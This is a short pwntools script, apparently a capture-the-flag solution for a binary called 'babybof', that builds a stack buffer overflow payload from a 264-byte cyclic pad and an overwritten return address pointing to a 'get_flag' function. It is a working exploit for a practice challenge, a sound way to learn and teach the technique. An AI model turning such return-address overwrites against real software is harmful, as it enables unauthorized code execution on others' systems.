from pwn import *

# host, port = '',
# p = remote(host, port)

# p = process('./babybof')

offset = 264
get_flag = 0x04006e7

payload = ''
payload += cyclic(offset)
payload += p64(get_flag)

# print p.recvline()
# print p.recvline()
# print p.recvline()
# p.sendline(payload)
# p.interactive()

print payload